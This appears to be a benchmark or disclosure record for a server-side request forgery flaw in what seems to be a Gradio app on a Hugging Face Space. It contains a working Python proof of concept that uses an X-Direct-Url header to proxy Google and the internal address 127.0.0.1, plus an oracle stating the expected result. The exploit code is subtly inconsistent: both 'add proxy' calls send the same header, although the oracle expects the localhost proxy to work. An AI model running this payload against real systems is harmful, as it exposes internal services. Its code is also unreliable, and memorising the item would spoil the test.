title: Insufficient SSRF protection allows arbitrary URL proxying via X-Direct-Url header manipulation
trigger_payload:
import requests
url = "https://vvxhid-nothing.hf.space/" # Example app
p1 = "https://www.google.com/"
p2 = "http://127.0.0.1:7860/"
headers1 = {"X-Direct-Url": p1}
headers2 = {"X-Direct-Url": p2}
requests.get(url + "config/", headers=headers1) # add first proxy
requests.get(url + "config/", headers=headers1) # add second proxy
# Make requests
resp1 = requests.get(url + f"proxy={p1}")
resp2 = requests.get(url + f"proxy={p2}")
print("Google" in resp1.text)
print("gradio-app" in resp2.text)
oracle: The server proxies arbitrary URLs, as demonstrated by the presence of 'Google' in the response from the first proxy request and 'gradio-app' in the response from the second proxy request.
